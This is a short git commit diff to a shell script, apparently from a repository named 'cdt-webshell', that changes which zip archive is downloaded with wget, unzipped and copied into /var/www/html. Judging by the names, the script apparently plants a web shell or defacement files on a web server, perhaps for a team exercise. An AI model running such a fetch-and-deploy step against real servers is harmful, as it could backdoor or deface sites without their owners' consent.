22932cf18ebcbc13424e000fe7100682cf63ce14
Tyler <Tyfighter98@users.noreply.github.com>
2020-02-26 21:03:02 -0800

    Update test.sh

--- hacked/test.sh
+++ hacked/test.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
-wget https://github.com/Tyfighter98/cdt-webshell/raw/master/Archive.zip
-unzip Archive.zip
-cp -r ./Archive/* /var/www/html
+wget https://github.com/Tyfighter98/cdt-webshell/raw/master/hacked.zip
+unzip hacked.zip
+cp -r ./hacked/* /var/www/html
